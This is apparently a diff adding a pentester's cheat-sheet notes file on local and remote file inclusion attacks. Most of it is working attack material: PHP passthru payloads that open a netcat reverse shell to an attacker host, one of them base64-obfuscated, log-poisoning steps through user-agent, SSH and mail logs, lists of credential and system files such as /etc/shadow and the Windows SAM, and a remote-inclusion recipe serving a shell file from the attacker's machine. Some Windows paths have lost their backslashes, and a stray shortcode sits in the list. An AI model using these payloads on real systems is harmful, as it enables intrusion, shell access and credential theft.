@@ -1,0 +1,68 @@
+in documents folder, a python file is created to look for important windows files.
+
+passthru("nc -e /bin/sh <attackerip> <attackerport>");
+<?passthru("nc -e /bin/sh <attackerip> <attackerport>");?>
+<?passthru(base64_decode("#base64 encoded command > nc -e /bin/sh <attackerip> <attackerport>"));?>
+ssh "<?passthru(base64_decode("#base64 encoded command > nc -e /bin/sh <attackerip> <attackerport>"));?>
+
+
+method1 = run php code through useragent header via burpsuite.
+method2 = add a php code in the log files, /var/log/auth.log or mail log and send the php code through a bad ssh request ,using username as placeholder for php code. or through mail logs by sending an email.
+
+/proc/self/environ%00
+#This will read the useragent data for shell.
+/etc/passwd
+#users on the systems info
+
+/windows/win.ini
+
+
+
+Linux file locations:
+– /etc/issue
+– /proc/version
+– /etc/profile
+– /etc/passwd
+– /etc/passwd
+– /etc/shadow
+– /root/.bash_history
+– /var/log/dmessage
+– /var/mail/root
+– /var/spool/cron/crontabs/root
+
+
+Windows File Locations:
+
+– %SYSTEMROOT%repairsystem
+– %SYSTEMROOT%repairSAM
+– %SYSTEMROOT%repairSAM
+– %WINDIR%win.ini
+– %SYSTEMDRIVE%boot.ini
+– %WINDIR%Panthersysprep.inf
+– %WINDIR%system32configAppEvent.Evt
+[/vc_tta_section]
+
+OS/X macOS File Locations:
+
+– /etc/fstab
+– /etc/master.passwd
+– /etc/resolv.conf
+– /etc/sudoers
+– /etc/sysctl.conf
+
+---------------------------------------------------------------
+----------------------------------------------------------------
+Remote File Inclusion:
+
+make a .txt file
+<?php
+passthru("nc -e /bin/sh attackerip attackerport");
+?>
+make the file accessible to victim
+in victim machine type:
+?page=http://attackerip/reverse.txt?
+//question mark make it run on victim as php.
+
+
+
+
